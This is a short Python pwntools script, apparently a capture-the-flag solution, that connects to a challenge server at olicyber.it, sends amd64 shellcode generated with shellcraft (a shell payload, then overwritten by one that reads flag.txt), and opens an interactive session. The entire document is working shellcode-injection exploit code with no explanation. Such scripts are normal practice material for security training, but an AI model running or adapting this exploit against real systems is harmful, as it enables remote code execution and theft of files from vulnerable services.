from pwn import *

p = remote("software-20.challs.olicyber.it", 13003)

p.recvuntil(b"...")
p.recvuntil(b"...")
p.sendline(b"c")
p.recvuntil(b": ")

asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')
testo = shellcraft.amd64.linux.cat("flag.txt")
shellcode = asm(testo, arch='x86_64')
p.sendline(str(len(shellcode)).encode())
p.recvuntil(b": ")
p.send(shellcode)
p.interactive()

